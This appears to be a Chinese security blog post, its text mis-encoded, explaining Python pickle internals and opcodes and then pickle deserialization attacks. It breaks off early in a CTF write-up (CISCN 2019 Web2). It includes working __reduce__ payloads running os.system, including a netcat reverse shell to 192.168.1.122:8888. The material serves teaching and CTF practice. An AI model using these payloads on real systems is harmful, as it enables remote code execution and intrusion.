<h2 id="pickleæ¨¡å—è¯¦è§£"><a href="#pickleæ¨¡å—è¯¦è§£" class="headerlink" title="pickleæ¨¡å—è¯¦è§£"></a>pickleæ¨¡å—è¯¦è§£</h2><h3 id="pickleåŸºç¡€"><a href="#pickleåŸºç¡€" class="headerlink" title="pickleåŸºç¡€"></a>pickleåŸºç¡€</h3><p>pickleæ˜¯ä¸€ç§ç‹¬ç«‹çš„åºåˆ—åŒ–æ ˆè¯­è¨€ï¼Œé€šè¿‡å¯¹opcodeçš„æ›´æ”¹ç¼–å†™å¯ä»¥æ‰§è¡Œpythonä»£ç ã€è¦†ç›–å˜é‡ç­‰æ“ä½œã€‚ç›´æ¥ç¼–å†™çš„opcodeçµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ã€‚</p>
<p>åºåˆ—åŒ–å‡½æ•°ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python">pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>æ–‡ä»¶<span class="token punctuation">)</span> 
pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>å­—ç¬¦ä¸²<span class="token punctuation">)</span></code></pre>

<p>ååºåˆ—åŒ–å‡½æ•°ï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python">pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>æ–‡ä»¶<span class="token punctuation">)</span>
pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>å­—ç¬¦ä¸²<span class="token punctuation">)</span></code></pre>



<h3 id="pickleå¯åºåˆ—åŒ–çš„å¯¹è±¡"><a href="#pickleå¯åºåˆ—åŒ–çš„å¯¹è±¡" class="headerlink" title="pickleå¯åºåˆ—åŒ–çš„å¯¹è±¡"></a>pickleå¯åºåˆ—åŒ–çš„å¯¹è±¡</h3><ul>
<li><code>None</code> ã€ <code>True</code> å’Œ <code>False</code></li>
<li>æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•°</li>
<li>strã€byteã€bytearray</li>
<li>åªåŒ…å«å¯å°å­˜å¯¹è±¡çš„é›†åˆï¼ŒåŒ…æ‹¬ tupleã€listã€set å’Œ dict</li>
<li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å‡½æ•°ï¼ˆä½¿ç”¨ def å®šä¹‰ï¼Œlambda å‡½æ•°åˆ™ä¸å¯ä»¥ï¼‰</li>
<li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å†…ç½®å‡½æ•°</li>
<li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„ç±»</li>
<li><code>__dict__</code> å±æ€§å€¼æˆ– <code>__getstate__()</code> å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ï¼ˆè¯¦è§å®˜æ–¹æ–‡æ¡£çš„Pickling Class Instancesï¼‰</li>
</ul>
<h3 id="object-reduce-å‡½æ•°"><a href="#object-reduce-å‡½æ•°" class="headerlink" title="object.__reduce__å‡½æ•°"></a><code>object.__reduce__</code>å‡½æ•°</h3><ul>
<li><p>å¼€å‘æ—¶ï¼Œå¯ä»¥é‡å†™ç±»çš„<code>__reduce__</code>æ–¹æ³•ï¼Œä½¿ä¹‹åœ¨è¢«å®ä¾‹åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œã€‚è¯¥å‡½æ•°åœ¨è°ƒç”¨æ—¶è¿”å›<code>(callable, ([para1,para2...])[,...])</code>å…ƒç»„ï¼Œè¯¥ç±»åœ¨è¢«unpickleæ—¶ï¼Œå…¶ä¸­çš„callableå°±ä¼šè¢«è°ƒç”¨ç”Ÿæˆå¯¹è±¡ã€‚(å…¶ä¸­callableæ˜¯æ„é€ å‡½æ•°)</p>
</li>
<li><p>åœ¨opcodeä¸­ï¼Œ<code>__reduce__</code>çš„æŒ‡ä»¤æ˜¯<code>R</code>,å®ƒæ˜¯é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ï¼Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆè¯¥å¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°ã€‚å…¶ä¸­<code>R</code>çœŸå¥½å¯¹åº”<code>__reduce__</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°è¿”å›å€¼ä½œä¸º<code>R</code>çš„ä½œç”¨å¯¹è±¡ï¼Œå½“åŒ…å«è¯¥å‡½æ•°çš„å¯¹è±¡è¢«pickleåºåˆ—åŒ–æ—¶ï¼Œå¾—åˆ°çš„å­—ç¬¦ä¸²ä¹ŸåŒ…å«äº†<code>R</code>ã€‚</p>
</li>
<li><p>demo</p>
</li>
</ul>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
<span class="token comment">#-*â€” coding:utf-8 -*-</span>

<span class="token keyword">import</span> os
<span class="token keyword">import</span> pickle

<span class="token keyword">class</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		
obj <span class="token operator">=</span> Student<span class="token punctuation">(</span><span class="token punctuation">)</span>
serialize <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218113123136.png" alt="image-20210218113123136" loading="lazy"></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
<span class="token comment">#-*â€” coding:utf-8 -*-</span>

<span class="token keyword">import</span> os
<span class="token keyword">import</span> pickle

<span class="token keyword">class</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		
obj <span class="token operator">=</span> Student<span class="token punctuation">(</span><span class="token punctuation">)</span>
serialize <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>obj<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
unserialize <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>serialize<span class="token punctuation">)</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218132059917.png" alt="image-20210218132059917" loading="lazy"></p>
<h3 id="pickleè¿‡ç¨‹è¯¦è§£"><a href="#pickleè¿‡ç¨‹è¯¦è§£" class="headerlink" title="pickleè¿‡ç¨‹è¯¦è§£"></a>pickleè¿‡ç¨‹è¯¦è§£</h3><ul>
<li><p>pickleçš„è§£æä¾é PVM(pickle virtual machine)</p>
</li>
<li><p>PVMçš„æ„æˆï¼š1 è§£æå¼•æ“ 2 æ ˆ 3 å†…å­˜</p>
</li>
<li><p>è§£æå¼•æ“</p>
<p>ä»æµä¸­è¯»å–opcodeå’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼ŒçŸ¥é“é‡åˆ°<code>.</code>åœæ­¢ã€‚æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚</p>
</li>
<li><p>æ ˆ</p>
<p>ç”±pythonçš„listå®ç°ï¼Œè¢«ç”¨æ¥çš„ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡</p>
</li>
<li><p><code>memo</code></p>
<p>ç”±pythonçš„dictå®ç°ï¼Œå°†ååºåˆ—åŒ–å®Œæˆçš„æ•°æ®ä»¥<code>key-value</code>çš„å½¢å¼å­˜å‚¨åœ¨memoä¸­ï¼Œä»¥ä¾¿åæ¥ä½¿ç”¨ã€‚</p>
</li>
<li><p>PVMè§£æstræµç¨‹</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/20200320230631-6204866e-6abc-1.gif" alt="img" loading="lazy"></p>
</li>
<li><p>PVMè§£æ <code>__reduce__()</code> æµç¨‹</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200320230711-7972c0ea-6abc-1.gif" alt="img" loading="lazy"></p>
</li>
</ul>
<h3 id="opcodeç‰ˆæœ¬"><a href="#opcodeç‰ˆæœ¬" class="headerlink" title="opcodeç‰ˆæœ¬"></a>opcodeç‰ˆæœ¬</h3><ul>
<li>pickleä¸åŒçš„å®ç°ç‰ˆæœ¬å¾—åˆ°çš„opcodeä¸ç›¸åŒï¼Œä½†æ˜¯pickleå¯ä»¥å‘ä¸‹å…¼å®¹ï¼Œç›®å‰ä¸€å…±æœ‰å…­ä¸ªç‰ˆæœ¬</li>
</ul>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
<span class="token comment">#-*â€” coding:utf-8 -*-</span>

<span class="token keyword">import</span> os
<span class="token keyword">import</span> pickle

a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'zhang'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">&#125;</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'pickleç‰ˆæœ¬</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">,</span> protocol<span class="token operator">=</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<ul>
<li>è¿è¡Œç»“æœ</li>
</ul>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210218164929904.png" alt="image-20210218164929904" loading="lazy"></p>
<ul>
<li>pickle3ç‰ˆæœ¬çš„opcodeè¯¦è§£:</li>
</ul>
<pre class="language-none"><code class="language-none">&#123;&#39;name&#39;:&#39;zhang&#39;, &#39;age&#39;:19&#125;
b&#39;\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00zhangq\x02X\x03\x00\x00\x00ageq\x03K\x13u.&#39;
# \x80ï¼šåè®®å¤´å£°æ˜ 
# \x03ï¼šåè®®ç‰ˆæœ¬
# \x04\x00\x00\x00: æ•°æ®é•¿åº¦4
# name: æ•°æ®
# qï¼š å­˜å‚¨æ ˆé¡¶çš„å­—ç¬¦ä¸²é•¿åº¦: ä¸€ä¸ªå­—èŠ‚(å³\x00)
# \x13u:ä»£è¡¨æ ˆé¡¶ä½ç½®
# .: æ•°æ®ç»“æŸç¬¦</code></pre>

<ul>
<li>æŒ‡ä»¤é›†</li>
</ul>
<pre class="language-none"><code class="language-none">MARK           &#x3D; b&#39;(&#39;   # push special markobject on stack
STOP           &#x3D; b&#39;.&#39;   # every pickle ends with STOP
POP            &#x3D; b&#39;0&#39;   # discard topmost stack item
POP_MARK       &#x3D; b&#39;1&#39;   # discard stack top through topmost markobject
DUP            &#x3D; b&#39;2&#39;   # duplicate top stack item
FLOAT          &#x3D; b&#39;F&#39;   # push float object; decimal string argument
INT            &#x3D; b&#39;I&#39;   # push integer or bool; decimal string argument
BININT         &#x3D; b&#39;J&#39;   # push four-byte signed int
BININT1        &#x3D; b&#39;K&#39;   # push 1-byte unsigned int
LONG           &#x3D; b&#39;L&#39;   # push long; decimal string argument
BININT2        &#x3D; b&#39;M&#39;   # push 2-byte unsigned int
NONE           &#x3D; b&#39;N&#39;   # push None
PERSID         &#x3D; b&#39;P&#39;   # push persistent object; id is taken from string arg
BINPERSID      &#x3D; b&#39;Q&#39;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack
REDUCE         &#x3D; b&#39;R&#39;   # apply callable to argtuple, both on stack
STRING         &#x3D; b&#39;S&#39;   # push string; NL-terminated string argument
BINSTRING      &#x3D; b&#39;T&#39;   # push string; counted binary string argument
SHORT_BINSTRING&#x3D; b&#39;U&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes
UNICODE        &#x3D; b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argument
BINUNICODE     &#x3D; b&#39;X&#39;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument
APPEND         &#x3D; b&#39;a&#39;   # append stack top to list below it
BUILD          &#x3D; b&#39;b&#39;   # call __setstate__ or __dict__.update()
GLOBAL         &#x3D; b&#39;c&#39;   # push self.find_class(modname, name); 2 string args
DICT           &#x3D; b&#39;d&#39;   # build a dict from stack items
EMPTY_DICT     &#x3D; b&#39;&#125;&#39;   # push empty dict
APPENDS        &#x3D; b&#39;e&#39;   # extend list on stack by topmost stack slice
GET            &#x3D; b&#39;g&#39;   # push item from memo on stack; index is string arg
BINGET         &#x3D; b&#39;h&#39;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg
INST           &#x3D; b&#39;i&#39;   # build &amp; push class instance
LONG_BINGET    &#x3D; b&#39;j&#39;   # push item from memo on stack; index is 4-byte arg
LIST           &#x3D; b&#39;l&#39;   # build list from topmost stack items
EMPTY_LIST     &#x3D; b&#39;]&#39;   # push empty list
OBJ            &#x3D; b&#39;o&#39;   # build &amp; push class instance
PUT            &#x3D; b&#39;p&#39;   # store stack top in memo; index is string arg
BINPUT         &#x3D; b&#39;q&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg
LONG_BINPUT    &#x3D; b&#39;r&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg
SETITEM        &#x3D; b&#39;s&#39;   # add key+value pair to dict
TUPLE          &#x3D; b&#39;t&#39;   # build tuple from topmost stack items
EMPTY_TUPLE    &#x3D; b&#39;)&#39;   # push empty tuple
SETITEMS       &#x3D; b&#39;u&#39;   # modify dict by adding topmost key+value pairs
BINFLOAT       &#x3D; b&#39;G&#39;   # push float; arg is 8-byte float encoding

TRUE           &#x3D; b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.py
FALSE          &#x3D; b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py</code></pre>



<h3 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h3><p>è¯¥å·¥å…·å¯ä»¥æ–¹ä¾¿çš„æŠŠopcodeä»£ç è½¬åŒ–æˆè‚‰çœ¼ä¾¿äºé˜…è¯»çš„å½¢å¼ã€‚pickletoolsæ˜¯pythonè‡ªå¸¦çš„pickleè°ƒè¯•å™¨ï¼Œæœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼šåæ±‡ç¼–ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²ã€ä¼˜åŒ–ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²ã€è¿”å›ä¸€ä¸ªè¿­ä»£å™¨æ¥ä¾›ç¨‹åºä½¿ç”¨ã€‚</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
<span class="token comment">#-*â€” coding:utf-8 -*-</span>

<span class="token keyword">import</span> pickletools

data <span class="token operator">=</span> <span class="token string">b"\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00zhangq\x02X\x03\x00\x00\x00ageq\x03K\x13u."</span>

pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre>

<p>å¾—åˆ°åŸå§‹å­—ç¬¦ä¸²çš„åæ±‡ç¼–ç»“æœï¼š</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210219092045080.png" alt="image-20210219092045080" loading="lazy"></p>
<p>åæ±‡ç¼–åŠŸèƒ½ï¼šè§£æå­—ç¬¦ä¸²ï¼Œå‘Šè¯‰ä½ è¿™ä¸ªå­—ç¬¦ä¸²åšäº†ä»€ä¹ˆäº‹æƒ…ï¼Œæ¯ä¸€è¡Œéƒ½æ˜¯ä¸€ä¸ªæŒ‡ä»¤ã€‚</p>
<p>ä¼˜åŒ–åŠŸèƒ½:</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python3</span>
<span class="token comment">#-*â€” coding:utf-8 -*-</span>

<span class="token keyword">import</span> pickletools

data <span class="token operator">=</span> <span class="token string">b"\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x05\x00\x00\x00zhangq\x02X\x03\x00\x00\x00ageq\x03K\x13u."</span>

data <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre>

<p>è¿è¡Œç»“æœï¼š</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210219095145179.png" alt="image-20210219095145179" loading="lazy"></p>
<p>é€šè¿‡ç»“æœæˆ‘ä»¬å¯ä»¥å‘ç°å­—ç¬¦ä¸²æ¯”åŸæ¥çŸ­äº†å¾ˆå¤šï¼Œè€Œä¸”åæ±‡ç¼–ç»“æœä¸­ï¼ŒBINPUTæŒ‡ä»¤æ²¡æœ‰äº†ã€‚è¿™é‡Œçš„â€œä¼˜åŒ–â€ï¼Œå°±æ˜¯æŠŠä¸å¿…è¦çš„putæŒ‡ä»¤ç»™åˆ æ‰ã€‚è¿™é‡Œçš„putæ„æ€å°±æ˜¯æŠŠå½“å‰æ ˆçš„æ ˆé¡¶å¤åˆ¶ä¸€ä»½ï¼Œæ”¾è¿›å­˜å‚¨åŒºã€‚</p>
<h2 id="pickleååºåˆ—åŒ–æ¼æ´"><a href="#pickleååºåˆ—åŒ–æ¼æ´" class="headerlink" title="pickleååºåˆ—åŒ–æ¼æ´"></a>pickleååºåˆ—åŒ–æ¼æ´</h2><h3 id="åŸºæœ¬æè¿°"><a href="#åŸºæœ¬æè¿°" class="headerlink" title="åŸºæœ¬æè¿°"></a>åŸºæœ¬æè¿°</h3><p>å®˜æ–¹ç»™å®šçš„pickleååºåˆ—åŒ–åŠŸèƒ½æ˜¯å®‰å…¨çš„ï¼Œä¸”å®˜æ–¹åªæ˜¯æä¾›è¿™ä¸ªååºåˆ—åŒ–åŠŸèƒ½ï¼Œå…¶ä¸å®‰å…¨çš„é—®é¢˜äº§ç”Ÿï¼Œä¸»è¦ç”±äºä¼ å…¥äº†ä¸å®‰å…¨çš„åºåˆ—åŒ–å†…å®¹ï¼Œå¯¼è‡´äº†ä¸å®‰å…¨é—®é¢˜çš„äº§ç”Ÿã€‚</p>
<h3 id="æ¼æ´äº§ç”Ÿçš„åœºæ™¯"><a href="#æ¼æ´äº§ç”Ÿçš„åœºæ™¯" class="headerlink" title="æ¼æ´äº§ç”Ÿçš„åœºæ™¯"></a>æ¼æ´äº§ç”Ÿçš„åœºæ™¯</h3><ul>
<li><p>webæœåŠ¡å™¨è§£æè®¤è¯tokenã€sessionå€¼æ—¶</p>
<p>å¾ˆå¤šwebéƒ½ä½¿ç”¨redisã€mongodbã€memcachedç­‰æ¥å­˜å‚¨sessionç­‰çŠ¶æ€ä¿¡æ¯ã€‚</p>
</li>
<li><p>å°†å¯¹è±¡pickleåå­˜å‚¨æˆç£ç›˜æ–‡ä»¶</p>
</li>
<li><p>å°†å¯¹è±¡pickleååœ¨ç½‘ç»œä¸­ä¼ è¾“</p>
</li>
</ul>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>å½“åºåˆ—åŒ–åŠååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ç¢°åˆ°ä¸€æ— æ‰€çŸ¥çš„æ‰©å±•ç±»å‹ï¼ˆæ–°å¼ç±»ï¼‰æ—¶ï¼Œå¯ä»¥é€šè¿‡ç±»ä¸­çš„å®šä¹‰çš„<code>__reduce__</code>æ–¹æ³•æ¥å‘ŠçŸ¥å¦‚ä½•è¿›è¡Œåºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è‡ªå®šä¹‰<code>__reduce__</code>æ–¹æ³•æ¥è®©è¿™ä¸ªç±»æ ¹æ®æˆ‘ä»¬åœ¨<code>__reduce__</code>ä¸­æŒ‡å®šçš„æ–¹å¼è¿›è¡Œåºåˆ—åŒ–</p>
<h3 id="pyaloadæ„é€ "><a href="#pyaloadæ„é€ " class="headerlink" title="pyaloadæ„é€ "></a>pyaloadæ„é€ </h3><ul>
<li>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤payload</li>
</ul>
<p>dopickle.py</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment">#coding: utf-8</span>

<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> os

<span class="token keyword">class</span> <span class="token class-name">genpoc</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""whoami"""</span>  <span class="token comment">#è¦æ‰§è¡Œçš„å‘½ä»¤</span>
        <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">)</span>        <span class="token comment">#os.system("echo test >poc.txt")</span>

e <span class="token operator">=</span> genpoc<span class="token punctuation">(</span><span class="token punctuation">)</span>
poc <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span>
pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>poc<span class="token punctuation">)</span></code></pre>

<p>è¾“å‡ºç»“æœå‘½ä»¤æ‰§è¡Œäº†</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210220105856952.png" alt="image-20210220105856952" loading="lazy"></p>
<p>æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªæ“ä½œç </p>
<pre class="language-python" data-language="python"><code class="language-python">c <span class="token punctuation">:</span> è¯»å–æœ¬è¡Œçš„å†…å®¹ä½œä¸ºæ¨¡å—å<span class="token punctuation">(</span> module <span class="token punctuation">)</span> <span class="token punctuation">,</span> è¯»å–ä¸‹ä¸€è¡Œçš„å†…å®¹ä½œä¸ºå¯¹è±¡å<span class="token punctuation">(</span> <span class="token builtin">object</span> <span class="token punctuation">)</span> <span class="token punctuation">.</span> ç„¶åå°† module<span class="token punctuation">.</span><span class="token builtin">object</span> ä½œä¸ºå¯è°ƒç”¨å¯¹è±¡å‹å…¥åˆ°æ ˆä¸­
<span class="token punctuation">(</span> <span class="token punctuation">:</span> å°†ä¸€ä¸ªæ ‡è®°å¯¹è±¡å‹å…¥åˆ°æ ˆä¸­ <span class="token punctuation">,</span> ç”¨äºç¡®å®šå‘½ä»¤æ‰§è¡Œçš„ä½ç½® <span class="token punctuation">.</span> è¯¥æ ‡è®°å¸¸å¸¸æ­é… t æŒ‡ä»¤ä¸€èµ·ä½¿ç”¨ <span class="token punctuation">,</span> ä»¥ä¾¿äº§ç”Ÿä¸€ä¸ªå…ƒç»„
S <span class="token punctuation">:</span> åé¢è·Ÿå­—ç¬¦ä¸² <span class="token punctuation">,</span> PVMä¼šè¯»å–å¼•å·ä¸­çš„å†…å®¹ <span class="token punctuation">,</span> ç›´åˆ°é‡è§æ¢è¡Œç¬¦ <span class="token punctuation">,</span> ç„¶åå°†è¯»å–åˆ°çš„å†…å®¹å‹å…¥åˆ°æ ˆä¸­
t <span class="token punctuation">:</span> ä»æ ˆä¸­ä¸æ–­å¼¹å‡ºæ•°æ® <span class="token punctuation">,</span> å¼¹å°„é¡ºåºä¸å‹æ ˆæ—¶ç›¸åŒ <span class="token punctuation">,</span> ç›´åˆ°å¼¹å‡ºå·¦æ‹¬å· <span class="token punctuation">.</span> æ­¤æ—¶å¼¹å‡ºçš„å†…å®¹å½¢æˆäº†ä¸€ä¸ªå…ƒç»„ <span class="token punctuation">,</span> ç„¶å <span class="token punctuation">,</span> è¯¥å…ƒç»„ä¼šè¢«å‹å…¥æ ˆä¸­ <span class="token punctuation">.</span>
R <span class="token punctuation">:</span> å°†ä¹‹å‰å‹å…¥æ ˆä¸­çš„å…ƒç»„å’Œå¯è°ƒç”¨å¯¹è±¡å…¨éƒ¨å¼¹å‡º <span class="token punctuation">,</span> ç„¶åå°†è¯¥å…ƒç»„ä½œä¸ºå¯è°ƒç”¨å‚æ•°çš„å¯¹è±¡å¹¶æ‰§è¡Œè¯¥å¯¹è±¡  <span class="token punctuation">.</span>æœ€åå°†ç»“æœå‹å…¥åˆ°æ ˆä¸­ <span class="token punctuation">.</span>
<span class="token punctuation">.</span> <span class="token punctuation">:</span> ç»“æŸæ•´ä¸ª Pickle ååºåˆ—åŒ–è¿‡ç¨‹ <span class="token punctuation">.</span></code></pre>

<ul>
<li>åå¼¹shell</li>
</ul>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment">#coding: utf-8</span>

<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> os

<span class="token keyword">class</span> <span class="token class-name">genpoc</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        cmd <span class="token operator">=</span> <span class="token triple-quoted-string string">"""rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&amp;1 | nc 192.168.1.122 8888 >/tmp/f"""</span>  <span class="token comment">#è¦æ‰§è¡Œçš„å‘½ä»¤</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#os.system("echo test >poc.txt")</span>

e <span class="token operator">=</span> genpoc<span class="token punctuation">(</span><span class="token punctuation">)</span>
poc <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span>
pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>poc<span class="token punctuation">)</span></code></pre>

<p>åå¼¹æˆåŠŸ</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210220165100857.png" alt="image-20210220165100857" loading="lazy"></p>
<h2 id="ciscn-2019-Day1-Web2"><a href="#ciscn-2019-Day1-Web2" class="headerlink" title="ciscn 2019 Day1 Web2"></a>ciscn 2019 Day1 Web2</h2><h3 id="é€»è¾‘æ¼æ´ç»•è¿‡"><a href="#é€»è¾‘æ¼æ´ç»•è¿‡" class="headerlink" title="é€»è¾‘æ¼æ´ç»•è¿‡"></a>é€»è¾‘æ¼æ´ç»•è¿‡</h3><p>è¯·æ±‚é¦–é¡µï¼Œå‘ç°ä¸€ä¸ªç«™ç‚¹ï¼Œåœ¨æŸå¤„æç¤ºä¸€å®šè¦ä¹°åˆ°lv6</p>
<p>ä¸”å‘ç°é¡µé¢æœ‰æ³¨å†Œæœ‰ç™»é™†åŠŸèƒ½</p>
<p>å°è¯•æ³¨å†Œè´¦æˆ·<code>greetdawn 123</code>ï¼Œç™»é™†åè´­ä¹°lv6  </p>
